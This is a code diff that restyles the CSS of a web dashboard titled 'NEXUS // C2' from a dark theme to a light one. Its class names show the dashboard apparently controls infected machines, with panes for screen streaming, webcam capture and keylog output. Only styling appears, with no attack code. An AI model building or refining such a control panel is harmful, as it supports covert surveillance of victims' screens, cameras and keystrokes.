@@ -5,380 +5,905 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>NEXUS // C2</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@300;400;500;600&family=Instrument+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
 <style>
 /* ═══════════════════════════════════════════════
-   NEXUS C2 — Warm Industrial UI
-   Layout: Top navbar + card grid (NO sidebar)
-   Palette: Deep warm slate + ember orange
-   Font: Space Grotesk (UI) + IBM Plex Mono (code)
+   NEXUS C2 — Refined Light / Linear-style UI
+   Palette: Paper white + cool grays + vivid blue
+   Font: Instrument Sans (UI) + Geist Mono (code)
 ═══════════════════════════════════════════════ */
 :root{
-  --bg:#0f0e0d;
-  --s1:#161412;--s2:#1c1916;--s3:#221f1b;--s4:#2a2520;
-  --border:#312b24;--border2:#3d3530;
-  --fire:#f97316;--fire2:#fb923c;--fire-dim:rgba(249,115,22,0.15);
-  --red:#ef4444;--red-dim:rgba(239,68,68,0.12);
-  --green:#22c55e;--green-dim:rgba(34,197,94,0.1);
-  --blue:#60a5fa;--blue-dim:rgba(96,165,250,0.1);
-  --purple:#a78bfa;--purple-dim:rgba(167,139,250,0.1);
-  --text:#d6cfc6;--dim:#6b6057;--bright:#ece6de;
-  --mono:'IBM Plex Mono',monospace;
-  --sans:'Space Grotesk',sans-serif;
+  --bg:#f9f9fb;
+  --surface:#ffffff;
+  --surface2:#f4f4f6;
+  --surface3:#eeeef1;
+  --border:#e4e4e8;
+  --border2:#d0d0d8;
+  --shadow:rgba(0,0,0,0.06);
+  --shadow-lg:rgba(0,0,0,0.12);
+
+  --accent:#2563eb;
+  --accent-dim:rgba(37,99,235,0.08);
+  --accent-mid:rgba(37,99,235,0.15);
+  --green:#16a34a;
+  --green-dim:rgba(22,163,74,0.08);
+  --red:#dc2626;
+  --red-dim:rgba(220,38,38,0.08);
+  --amber:#d97706;
+  --amber-dim:rgba(217,119,6,0.08);
+  --purple:#7c3aed;
+  --purple-dim:rgba(124,58,237,0.08);
+
+  --text:#111827;
+  --muted:#6b7280;
+  --faint:#9ca3af;
+  --bright:#030712;
+  --mono:'Geist Mono',monospace;
+  --sans:'Instrument Sans',sans-serif;
+
+  --radius:8px;
+  --radius-lg:12px;
 }
 *{margin:0;padding:0;box-sizing:border-box;}
 html,body{height:100%;overflow:hidden;}
-body{background:var(--bg);color:var(--text);font-family:var(--sans);display:flex;flex-direction:column;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  display:flex;
+  flex-direction:column;
+  font-size:14px;
+  line-height:1.5;
+}
 
-/* Noise texture overlay */
-body::after{content:'';position:fixed;inset:0;
-  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
-  pointer-events:none;z-index:0;opacity:.4;}
+/* ── Subtle dot grid bg ── */
+body::before{
+  content:'';
+  position:fixed;inset:0;
+  background-image:radial-gradient(circle,rgba(0,0,0,0.06) 1px,transparent 1px);
+  background-size:20px 20px;
+  pointer-events:none;
+  z-index:0;
+  opacity:0.5;
+}
 
 /* ── TOPBAR ── */
-.topbar{flex-shrink:0;height:52px;display:flex;align-items:stretch;
-  border-bottom:1px solid var(--border2);background:var(--s1);z-index:20;position:relative;}
-.topbar-brand{display:flex;align-items:center;gap:10px;padding:0 24px;
-  border-right:1px solid var(--border2);min-width:200px;}
-.brand-mark{width:26px;height:26px;background:var(--fire);
+.topbar{
+  flex-shrink:0;height:56px;display:flex;align-items:center;
+  border-bottom:1px solid var(--border);
+  background:rgba(255,255,255,0.85);
+  backdrop-filter:blur(12px);
+  -webkit-backdrop-filter:blur(12px);
+  z-index:20;position:relative;
+  padding:0 20px;
+  gap:0;
+}
+.topbar-brand{
+  display:flex;align-items:center;gap:10px;
+  padding-right:20px;
+  border-right:1px solid var(--border);
+  min-width:180px;
+}
+.brand-mark{
+  width:26px;height:26px;
+  background:var(--accent);
   clip-path:polygon(50% 0%,100% 100%,0% 100%);
-  box-shadow:0 0 16px rgba(249,115,22,0.5);flex-shrink:0;}
-.brand-name{font-family:var(--sans);font-weight:700;font-size:16px;letter-spacing:3px;color:var(--bright);}
-.brand-name span{color:var(--fire);font-weight:300;}
-.topbar-stats{display:flex;align-items:stretch;border-right:1px solid var(--border2);}
-.tstat{display:flex;align-items:center;gap:8px;padding:0 20px;border-right:1px solid var(--border);cursor:default;}
+  box-shadow:0 2px 8px rgba(37,99,235,0.35);
+  flex-shrink:0;
+  animation:brand-float 4s ease-in-out infinite;
+}
+@keyframes brand-float{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(-2px)}
+}
+.brand-name{
+  font-family:var(--sans);
+  font-weight:700;
+  font-size:15px;
+  letter-spacing:0.08em;
+  color:var(--bright);
+}
+.brand-name span{color:var(--accent);font-weight:400;}
+
+.topbar-stats{
+  display:flex;align-items:center;
+  padding:0 20px;
+  gap:0;
+  border-right:1px solid var(--border);
+}
+.tstat{
+  display:flex;align-items:center;gap:8px;
+  padding:0 16px;
+  border-right:1px solid var(--border);
+  cursor:default;
+}
 .tstat:last-child{border-right:none;}
-.tstat-num{font-family:var(--mono);font-size:22px;font-weight:600;color:var(--bright);line-height:1;}
-.tstat-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;line-height:1.3;}
-.tstat-num.fire{color:var(--fire);}
+.tstat-num{
+  font-family:var(--mono);
+  font-size:20px;
+  font-weight:600;
+  color:var(--bright);
+  line-height:1;
+  transition:all 0.3s cubic-bezier(0.34,1.56,0.64,1);
+}
+.tstat-num.accent{color:var(--accent);}
 .tstat-num.green{color:var(--green);}
-.topbar-right{margin-left:auto;display:flex;align-items:center;gap:10px;padding:0 20px;}
-.live-pill{display:flex;align-items:center;gap:6px;padding:4px 10px;
-  background:var(--green-dim);border:1px solid rgba(34,197,94,0.25);
-  font-size:10px;font-weight:600;letter-spacing:2px;color:var(--green);}
-.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);
-  box-shadow:0 0 6px var(--green);animation:blink 2s infinite;}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
-.clock{font-family:var(--mono);font-size:13px;color:var(--dim);letter-spacing:2px;}
+.tstat-label{
+  font-size:11px;
+  color:var(--muted);
+  text-transform:uppercase;
+  letter-spacing:0.08em;
+  line-height:1.3;
+  font-weight:500;
+}
+.topbar-right{
+  margin-left:auto;
+  display:flex;align-items:center;gap:10px;
+}
+.live-pill{
+  display:flex;align-items:center;gap:6px;
+  padding:5px 10px;
+  background:var(--green-dim);
+  border:1px solid rgba(22,163,74,0.2);
+  border-radius:100px;
+  font-size:10px;font-weight:600;letter-spacing:0.1em;color:var(--green);
+}
+.live-dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--green);
+  box-shadow:0 0 0 0 rgba(22,163,74,0.4);
+  animation:live-pulse 2s infinite;
+}
+@keyframes live-pulse{
+  0%{box-shadow:0 0 0 0 rgba(22,163,74,0.4)}
+  70%{box-shadow:0 0 0 6px rgba(22,163,74,0)}
+  100%{box-shadow:0 0 0 0 rgba(22,163,74,0)}
+}
+.clock{font-family:var(--mono);font-size:12px;color:var(--muted);letter-spacing:0.08em;}
 
 /* ── MAIN WORKSPACE ── */
 .workspace{flex:1;display:flex;overflow:hidden;position:relative;z-index:1;}
 
-/* ── LEFT RAIL (log strip) ── */
-.rail{width:280px;flex-shrink:0;border-right:1px solid var(--border2);
-  display:flex;flex-direction:column;background:var(--s1);}
-.rail-head{flex-shrink:0;padding:12px 16px;border-bottom:1px solid var(--border);
-  font-size:10px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;
-  display:flex;justify-content:space-between;align-items:center;}
-.rail-head span.rl-count{font-family:var(--mono);font-size:11px;color:var(--fire);
-  background:var(--fire-dim);padding:1px 7px;letter-spacing:0;}
-.rail-log{flex:1;overflow-y:auto;padding:8px 0;}
-.rail-log::-webkit-scrollbar{width:2px;}
-.rail-log::-webkit-scrollbar-thumb{background:var(--border2);}
-.rlog-item{padding:7px 16px;display:flex;flex-direction:column;gap:2px;
-  border-bottom:1px solid rgba(49,43,36,0.5);transition:background .1s;}
-.rlog-item:hover{background:rgba(255,255,255,0.02);}
-.rlog-time{font-family:var(--mono);font-size:9px;color:var(--dim);}
-.rlog-msg{font-size:11px;color:var(--text);line-height:1.4;}
+/* ── LEFT RAIL ── */
+.rail{
+  width:256px;flex-shrink:0;
+  border-right:1px solid var(--border);
+  display:flex;flex-direction:column;
+  background:var(--surface);
+}
+.rail-head{
+  flex-shrink:0;
+  padding:12px 16px;
+  border-bottom:1px solid var(--border);
+  font-size:11px;
+  letter-spacing:0.1em;
+  color:var(--muted);
+  text-transform:uppercase;
+  font-weight:600;
+  display:flex;justify-content:space-between;align-items:center;
+}
+.rl-badge{
+  font-family:var(--mono);
+  font-size:10px;
+  color:var(--accent);
+  background:var(--accent-dim);
+  border:1px solid var(--accent-mid);
+  padding:1px 7px;
+  border-radius:100px;
+  letter-spacing:0;
+}
+.rail-log{flex:1;overflow-y:auto;padding:6px 0;}
+.rail-log::-webkit-scrollbar{width:3px;}
+.rail-log::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px;}
+.rlog-item{
+  padding:8px 16px;
+  display:flex;flex-direction:column;gap:2px;
+  border-bottom:1px solid var(--border);
+  animation:log-in 0.25s ease;
+  transition:background 0.1s;
+}
+@keyframes log-in{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
+.rlog-item:hover{background:var(--surface2);}
+.rlog-time{font-family:var(--mono);font-size:9px;color:var(--faint);}
+.rlog-msg{font-size:11px;color:var(--text);line-height:1.4;font-weight:500;}
 .rlog-msg.connect{color:var(--green);}
-.rlog-msg.disconnect{color:var(--fire);}
-.rlog-msg.info{color:var(--blue);}
+.rlog-msg.disconnect{color:var(--red);}
+.rlog-msg.info{color:var(--accent);}
 .rlog-msg.error{color:var(--red);}
 
-/* ── CARD GRID AREA ── */
-.grid-area{flex:1;overflow-y:auto;padding:20px;background:var(--bg);}
+/* ── CARD GRID ── */
+.grid-area{
+  flex:1;overflow-y:auto;
+  padding:24px;
+  background:var(--bg);
+}
 .grid-area::-webkit-scrollbar{width:6px;}
-.grid-area::-webkit-scrollbar-thumb{background:var(--border2);}
-.grid-toolbar{display:flex;align-items:center;gap:10px;margin-bottom:20px;}
-.grid-title{font-size:11px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;flex:1;}
-.node-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;}
+.grid-area::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px;}
+.grid-toolbar{
+  display:flex;align-items:center;gap:10px;
+  margin-bottom:20px;
+}
+.grid-title{
+  font-size:11px;
+  letter-spacing:0.1em;
+  color:var(--muted);
+  text-transform:uppercase;
+  font-weight:600;
+  flex:1;
+}
+.node-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(310px,1fr));
+  gap:14px;
+}
 
 /* ── NODE CARD ── */
-.ncard{background:var(--s2);border:1px solid var(--border2);
-  display:flex;flex-direction:column;overflow:hidden;
-  transition:border-color .2s,transform .15s,box-shadow .2s;cursor:default;
-  position:relative;}
-.ncard:hover{border-color:var(--border2);transform:translateY(-1px);
-  box-shadow:0 8px 32px rgba(0,0,0,0.4);}
-.ncard.is-online{border-left:3px solid var(--green);}
-.ncard.is-offline{border-left:3px solid var(--border2);}
-.ncard.is-selected{border-color:var(--fire);box-shadow:0 0 0 1px var(--fire-dim);}
-
-.ncard-head{padding:14px 16px;display:flex;align-items:flex-start;gap:12px;
-  border-bottom:1px solid var(--border);}
-.ncard-avatar{width:38px;height:38px;flex-shrink:0;display:flex;align-items:center;
-  justify-content:center;font-size:15px;font-weight:700;color:var(--fire);
-  background:var(--fire-dim);border:1px solid rgba(249,115,22,0.2);
-  font-family:var(--sans);position:relative;text-transform:uppercase;}
-.ncard-avatar.offline-av{color:var(--dim);background:rgba(107,96,87,0.1);border-color:var(--border);}
-.ncard-avatar .pulse-ring{position:absolute;inset:-4px;border:1px solid rgba(34,197,94,0.4);
-  border-radius:0;animation:ring-pulse 2.5s infinite;}
-@keyframes ring-pulse{0%,100%{opacity:.6;transform:scale(1)}50%{opacity:0;transform:scale(1.15)}}
+.ncard{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:var(--radius-lg);
+  display:flex;flex-direction:column;
+  overflow:hidden;
+  transition:border-color 0.2s,transform 0.2s,box-shadow 0.2s;
+  cursor:default;
+  position:relative;
+  animation:card-enter 0.35s cubic-bezier(0.34,1.2,0.64,1);
+}
+@keyframes card-enter{
+  from{opacity:0;transform:translateY(12px) scale(0.97)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+.ncard:hover{
+  border-color:var(--border2);
+  transform:translateY(-2px);
+  box-shadow:0 8px 24px var(--shadow-lg),0 2px 6px var(--shadow);
+}
+.ncard.is-online{
+  border-top:2px solid var(--green);
+}
+.ncard.is-offline{
+  opacity:0.75;
+}
+.ncard.is-selected{
+  border-color:var(--accent);
+  box-shadow:0 0 0 3px var(--accent-dim);
+}
+.ncard-head{
+  padding:14px 16px;
+  display:flex;align-items:flex-start;gap:12px;
+  border-bottom:1px solid var(--border);
+}
+.ncard-avatar{
+  width:38px;height:38px;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:700;
+  color:var(--accent);
+  background:var(--accent-dim);
+  border:1px solid var(--accent-mid);
+  border-radius:var(--radius);
+  font-family:var(--sans);
+  position:relative;text-transform:uppercase;
+}
+.ncard-avatar.offline-av{
+  color:var(--muted);
+  background:var(--surface2);
+  border-color:var(--border);
+}
+.ncard-avatar .pulse-ring{
+  position:absolute;inset:-5px;
+  border:1.5px solid rgba(22,163,74,0.4);
+  border-radius:calc(var(--radius) + 5px);
+  animation:ring-pulse 2.5s infinite;
+}
+@keyframes ring-pulse{
+  0%,100%{opacity:0.7;transform:scale(1)}
+  50%{opacity:0;transform:scale(1.1)}
+}
 .ncard-info{flex:1;min-width:0;}
-.ncard-hostname{font-size:14px;font-weight:600;color:var(--bright);
-  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;}
-.ncard-user{font-size:11px;color:var(--dim);font-family:var(--mono);}
+.ncard-hostname{
+  font-size:14px;font-weight:600;
+  color:var(--bright);
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+  margin-bottom:3px;
+}
+.ncard-user{font-size:11px;color:var(--muted);font-family:var(--mono);}
 .ncard-status{flex-shrink:0;display:flex;flex-direction:column;align-items:flex-end;gap:4px;}
-.status-pip{display:flex;align-items:center;gap:5px;font-size:10px;font-weight:600;
-  letter-spacing:1px;padding:2px 8px;text-transform:uppercase;}
-.status-pip.online{color:var(--green);background:var(--green-dim);}
-.status-pip.offline{color:var(--dim);background:rgba(107,96,87,0.1);}
-.status-pip::before{content:'';width:5px;height:5px;border-radius:50%;background:currentColor;flex-shrink:0;}
-.status-pip.online::before{animation:blink 1.5s infinite;}
+.status-pip{
+  display:flex;align-items:center;gap:5px;
+  font-size:10px;font-weight:600;
+  letter-spacing:0.08em;
+  padding:3px 8px;
+  text-transform:uppercase;
+  border-radius:100px;
+  border:1px solid transparent;
+}
+.status-pip.online{color:var(--green);background:var(--green-dim);border-color:rgba(22,163,74,0.2);}
+.status-pip.offline{color:var(--muted);background:var(--surface2);border-color:var(--border);}
+.status-pip::before{
+  content:'';width:5px;height:5px;border-radius:50%;
+  background:currentColor;flex-shrink:0;
+}
+.status-pip.online::before{animation:live-pulse 1.5s infinite;}
 
-.ncard-meta{padding:10px 16px;display:grid;grid-template-columns:1fr 1fr;gap:6px;
-  border-bottom:1px solid var(--border);}
-.nmeta{display:flex;flex-direction:column;gap:1px;}
-.nmeta-k{font-size:9px;letter-spacing:1px;color:var(--dim);text-transform:uppercase;}
-.nmeta-v{font-family:var(--mono);font-size:10px;color:var(--text);
-  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
-.nmeta-v.fire{color:var(--fire);}
+.ncard-meta{
+  padding:12px 16px;
+  display:grid;grid-template-columns:1fr 1fr;gap:8px;
+  border-bottom:1px solid var(--border);
+}
+.nmeta{display:flex;flex-direction:column;gap:2px;}
+.nmeta-k{font-size:10px;letter-spacing:0.06em;color:var(--faint);text-transform:uppercase;font-weight:600;}
+.nmeta-v{
+  font-family:var(--mono);font-size:11px;color:var(--text);
+  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
+.nmeta-v.accent{color:var(--accent);}
 
-.ncard-actions{padding:10px 16px;display:flex;gap:8px;align-items:center;}
+.ncard-actions{
+  padding:10px 16px;
+  display:flex;gap:8px;align-items:center;
+  background:var(--surface2);
+}
 
 /* ── EMPTY STATE ── */
-.empty-grid{grid-column:1/-1;display:flex;flex-direction:column;
-  align-items:center;justify-content:center;padding:80px 40px;gap:14px;
-  border:1px dashed var(--border2);color:var(--dim);}
-.empty-grid-icon{font-size:36px;opacity:0.3;}
-.empty-grid-text{font-size:12px;letter-spacing:3px;text-transform:uppercase;}
+.empty-grid{
+  grid-column:1/-1;
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  padding:80px 40px;gap:14px;
+  border:2px dashed var(--border2);
+  border-radius:var(--radius-lg);
+  color:var(--muted);
+}
+.empty-grid-icon{font-size:36px;opacity:0.35;}
+.empty-grid-text{font-size:12px;letter-spacing:0.1em;text-transform:uppercase;font-weight:600;}
 
 /* ── BUTTONS ── */
-.btn{font-family:var(--mono);font-size:10px;padding:6px 14px;
-  border:1px solid;cursor:pointer;background:transparent;
-  letter-spacing:1px;transition:all .15s;font-weight:500;text-transform:uppercase;
-  white-space:nowrap;}
-.btn:disabled{opacity:0.3;cursor:not-allowed;}
-.btn:not(:disabled):active{transform:scale(0.97);}
-.btn-fire{color:var(--fire);border-color:rgba(249,115,22,0.4);}
-.btn-fire:hover:not(:disabled){background:var(--fire-dim);border-color:var(--fire);}
-.btn-ghost{color:var(--dim);border-color:var(--border2);}
-.btn-ghost:hover:not(:disabled){color:var(--text);border-color:var(--border2);background:rgba(255,255,255,0.04);}
-.btn-red{color:var(--red);border-color:rgba(239,68,68,0.35);}
-.btn-red:hover:not(:disabled){background:var(--red-dim);border-color:var(--red);}
-.btn-green{color:var(--green);border-color:rgba(34,197,94,0.35);}
-.btn-green:hover:not(:disabled){background:var(--green-dim);border-color:var(--green);}
-.btn-blue{color:var(--blue);border-color:rgba(96,165,250,0.35);}
-.btn-blue:hover:not(:disabled){background:var(--blue-dim);border-color:var(--blue);}
-.btn-warn{color:#f59e0b;border-color:rgba(245,158,11,0.35);}
-.btn-warn:hover:not(:disabled){background:rgba(245,158,11,0.08);border-color:#f59e0b;}
-.btn-purple{color:var(--purple);border-color:rgba(167,139,250,0.35);}
-.btn-purple:hover:not(:disabled){background:var(--purple-dim);border-color:var(--purple);}
-.btn-sm{padding:3px 8px;font-size:9px;}
-.btn-full{width:100%;display:block;text-align:center;padding:8px;}
+.btn{
+  font-family:var(--mono);
+  font-size:10px;
+  padding:6px 12px;
+  border:1px solid;
+  cursor:pointer;
+  background:transparent;
+  letter-spacing:0.06em;
+  transition:all 0.15s;
+  font-weight:500;
+  text-transform:uppercase;
+  white-space:nowrap;
+  border-radius:6px;
+}
+.btn:disabled{opacity:0.35;cursor:not-allowed;}
+.btn:not(:disabled):active{transform:scale(0.96);}
+.btn:not(:disabled):hover{transform:translateY(-1px);}
+.btn-primary{
+  color:#fff;
+  border-color:var(--accent);
+  background:var(--accent);
+  box-shadow:0 1px 3px rgba(37,99,235,0.3);
+}
+.btn-primary:hover:not(:disabled){
+  background:#1d4ed8;border-color:#1d4ed8;
+  box-shadow:0 4px 12px rgba(37,99,235,0.35);
+}
+.btn-ghost{
+  color:var(--muted);
+  border-color:var(--border2);
+  background:var(--surface);
+}
+.btn-ghost:hover:not(:disabled){
+  color:var(--text);
+  border-color:var(--border2);
+  background:var(--surface2);
+  box-shadow:0 2px 6px var(--shadow);
+}
+.btn-red{color:var(--red);border-color:rgba(220,38,38,0.25);background:var(--surface);}
+.btn-red:hover:not(:disabled){background:var(--red-dim);border-color:rgba(220,38,38,0.4);box-shadow:0 2px 6px rgba(220,38,38,0.1);}
+.btn-green{color:var(--green);border-color:rgba(22,163,74,0.25);background:var(--surface);}
+.btn-green:hover:not(:disabled){background:var(--green-dim);border-color:rgba(22,163,74,0.4);}
+.btn-blue{color:var(--accent);border-color:rgba(37,99,235,0.25);background:var(--surface);}
+.btn-blue:hover:not(:disabled){background:var(--accent-dim);border-color:rgba(37,99,235,0.4);}
+.btn-warn{color:var(--amber);border-color:rgba(217,119,6,0.25);background:var(--surface);}
+.btn-warn:hover:not(:disabled){background:var(--amber-dim);border-color:rgba(217,119,6,0.4);}
+.btn-purple{color:var(--purple);border-color:rgba(124,58,237,0.25);background:var(--surface);}
+.btn-purple:hover:not(:disabled){background:var(--purple-dim);border-color:rgba(124,58,237,0.4);}
+.btn-fire{color:var(--accent);border-color:rgba(37,99,235,0.25);background:var(--surface);}
+.btn-fire:hover:not(:disabled){background:var(--accent-dim);border-color:var(--accent);}
+.btn-sm{padding:4px 9px;font-size:9px;}
+.btn-full{width:100%;display:block;text-align:center;padding:9px;}
 
-/* ── OVERLAYS ── */
-.modal-overlay{display:none;position:fixed;inset:0;
-  background:rgba(0,0,0,0.8);backdrop-filter:blur(6px);
-  z-index:1000;align-items:center;justify-content:center;}
-.modal-overlay.open{display:flex;}
+/* ── MODAL OVERLAY ── */
+.modal-overlay{
+  display:none;
+  position:fixed;inset:0;
+  background:rgba(0,0,0,0.25);
+  backdrop-filter:blur(4px);
+  -webkit-backdrop-filter:blur(4px);
+  z-index:1000;
+  align-items:center;justify-content:center;
+}
+.modal-overlay.open{
+  display:flex;
+  animation:overlay-in 0.2s ease;
+}
+@keyframes overlay-in{from{opacity:0}to{opacity:1}}
 
 /* ── CONTROL MODAL ── */
-.modal{background:var(--s2);border:1px solid var(--border2);
+.modal{
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-radius:var(--radius-lg);
   width:98vw;max-width:1400px;height:92vh;
   display:flex;flex-direction:column;overflow:hidden;
-  box-shadow:0 24px 80px rgba(0,0,0,0.7);}
-.modal-header{flex-shrink:0;padding:14px 20px;border-bottom:1px solid var(--border2);
-  display:flex;align-items:center;justify-content:space-between;background:var(--s1);}
+  box-shadow:0 24px 80px rgba(0,0,0,0.18),0 8px 24px var(--shadow);
+  animation:modal-in 0.25s cubic-bezier(0.34,1.2,0.64,1);
+}
+@keyframes modal-in{
+  from{opacity:0;transform:scale(0.97) translateY(8px)}
+  to{opacity:1;transform:scale(1) translateY(0)}
+}
+.modal-header{
+  flex-shrink:0;
+  padding:14px 20px;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+  background:var(--surface);
+}
 .modal-title-wrap{display:flex;align-items:center;gap:14px;}
-.modal-node-av{width:32px;height:32px;background:var(--fire-dim);border:1px solid rgba(249,115,22,0.3);
-  display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--fire);font-size:13px;}
-.modal-title{font-family:var(--sans);font-size:15px;font-weight:700;color:var(--bright);letter-spacing:2px;}
-.modal-subtitle{font-family:var(--mono);font-size:10px;color:var(--dim);letter-spacing:1px;}
-.modal-close{background:none;border:1px solid transparent;color:var(--dim);
-  font-size:18px;cursor:pointer;padding:4px 10px;transition:all .15s;font-family:var(--mono);}
-.modal-close:hover{color:var(--red);border-color:rgba(239,68,68,0.3);background:var(--red-dim);}
-.modal-tabs{flex-shrink:0;display:flex;flex-wrap:wrap;border-bottom:1px solid var(--border2);
-  background:var(--s1);overflow-x:auto;}
-.tab-btn{flex-shrink:0;padding:10px 16px;font-family:var(--mono);
-  font-size:9px;letter-spacing:2px;background:none;border:none;
-  border-bottom:2px solid transparent;color:var(--dim);cursor:pointer;
-  text-transform:uppercase;white-space:nowrap;transition:all .15s;font-weight:500;}
-.tab-btn:hover{color:var(--text);background:rgba(255,255,255,0.02);}
-.tab-btn.active{color:var(--fire);border-bottom-color:var(--fire);background:rgba(249,115,22,0.04);}
+.modal-node-av{
+  width:32px;height:32px;
+  background:var(--accent-dim);
+  border:1px solid var(--accent-mid);
+  border-radius:var(--radius);
+  display:flex;align-items:center;justify-content:center;
+  font-weight:700;color:var(--accent);font-size:13px;
+}
+.modal-title{
+  font-family:var(--sans);font-size:15px;font-weight:700;
+  color:var(--bright);letter-spacing:0.02em;
+}
+.modal-subtitle{
+  font-family:var(--mono);font-size:10px;
+  color:var(--muted);letter-spacing:0.04em;
+}
+.modal-close{
+  background:var(--surface2);
+  border:1px solid var(--border);
+  border-radius:6px;
+  color:var(--muted);
+  font-size:16px;cursor:pointer;
+  padding:4px 10px;
+  transition:all 0.15s;
+  font-family:var(--mono);
+}
+.modal-close:hover{
+  color:var(--red);
+  border-color:rgba(220,38,38,0.3);
+  background:var(--red-dim);
+}
+
+.modal-tabs{
+  flex-shrink:0;
+  display:flex;flex-wrap:wrap;
+  border-bottom:1px solid var(--border);
+  background:var(--surface2);
+  overflow-x:auto;
+  gap:0;
+}
+.tab-btn{
+  flex-shrink:0;
+  padding:10px 14px;
+  font-family:var(--mono);
+  font-size:9px;
+  letter-spacing:0.1em;
+  background:none;border:none;
+  border-bottom:2px solid transparent;
+  color:var(--muted);cursor:pointer;
+  text-transform:uppercase;
+  white-space:nowrap;
+  transition:all 0.15s;
+  font-weight:500;
+  position:relative;
+}
+.tab-btn:hover{color:var(--text);background:var(--surface3);}
+.tab-btn.active{
+  color:var(--accent);
+  border-bottom-color:var(--accent);
+  background:var(--surface);
+}
 .modal-body{flex:1;min-height:0;display:flex;flex-direction:column;}
 .tab-content{display:none;flex:1;min-height:0;flex-direction:column;}
 .tab-content.active{display:flex;}
 
 /* ── CONFIRM DIALOG ── */
-.confirm-box{background:var(--s2);border:1px solid var(--border2);
-  padding:30px 32px;min-width:380px;max-width:460px;
-  box-shadow:0 20px 60px rgba(0,0,0,0.8);
-  animation:pop .16s ease;}
-@keyframes pop{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+.confirm-box{
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-radius:var(--radius-lg);
+  padding:28px 32px;
+  min-width:380px;max-width:460px;
+  box-shadow:0 20px 60px rgba(0,0,0,0.15);
+  animation:modal-in 0.2s ease;
+}
 .confirm-icon{font-size:28px;margin-bottom:12px;}
 .confirm-title{font-size:16px;font-weight:700;color:var(--bright);margin-bottom:8px;}
-.confirm-body{font-size:12px;color:var(--dim);line-height:1.7;margin-bottom:16px;}
-.confirm-target{font-family:var(--mono);font-size:11px;color:var(--fire);
-  background:var(--fire-dim);border:1px solid rgba(249,115,22,0.2);
-  padding:8px 12px;margin-bottom:20px;word-break:break-all;}
+.confirm-body{font-size:12px;color:var(--muted);line-height:1.7;margin-bottom:16px;}
+.confirm-target{
+  font-family:var(--mono);font-size:11px;color:var(--accent);
+  background:var(--accent-dim);
+  border:1px solid var(--accent-mid);
+  border-radius:6px;
+  padding:8px 12px;margin-bottom:20px;word-break:break-all;
+}
 .confirm-btns{display:flex;gap:10px;justify-content:flex-end;}
 
-/* ── STREAM / TOOL PANES ── */
-.stream-wrapper{flex:1;min-height:0;overflow:auto;display:flex;
-  align-items:flex-start;justify-content:center;padding:10px;background:#000;}
+/* ── STREAM PANES ── */
+.stream-wrapper{
+  flex:1;min-height:0;overflow:auto;
+  display:flex;align-items:flex-start;justify-content:center;
+  padding:10px;
+  background:#f0f0f3;
+}
 .stream-wrapper::-webkit-scrollbar{width:4px;height:4px;}
-.stream-wrapper::-webkit-scrollbar-thumb{background:var(--border2);}
-#screen-img{max-width:100%;display:block;cursor:crosshair;}
-#webcam-img{max-width:100%;display:block;}
-.stream-toolbar{flex-shrink:0;padding:8px 14px;border-top:1px solid var(--border2);
-  display:flex;align-items:center;gap:8px;flex-wrap:wrap;background:var(--s1);}
-.stream-status{font-family:var(--mono);font-size:9px;color:var(--dim);margin-left:auto;letter-spacing:1px;}
-.keylog-output{flex:1;min-height:0;overflow-y:auto;padding:14px 18px;font-size:12px;
-  line-height:2;background:#0a0906;border:none;white-space:pre-wrap;
-  word-break:break-all;font-family:var(--mono);}
+.stream-wrapper::-webkit-scrollbar-thumb{background:var(--border2);border-radius:10px;}
+#screen-img{max-width:100%;display:block;cursor:crosshair;border-radius:4px;}
+#webcam-img{max-width:100%;display:block;border-radius:4px;}
+.stream-toolbar{
+  flex-shrink:0;
+  padding:8px 14px;
+  border-top:1px solid var(--border);
+  display:flex;align-items:center;gap:8px;flex-wrap:wrap;
+  background:var(--surface);
+}
+.stream-status{
+  font-family:var(--mono);font-size:9px;
+  color:var(--muted);margin-left:auto;letter-spacing:0.06em;
+}
+
+/* Terminal-style elements */
+.terminal-bg{background:#0f1117;border-radius:6px;}
+.keylog-output{
+  flex:1;min-height:0;overflow-y:auto;
+  padding:14px 18px;font-size:12px;
+  line-height:2;
+  background:#0f1117;
+  border:none;white-space:pre-wrap;
+  word-break:break-all;font-family:var(--mono);
+  color:#e2e8f0;
+}
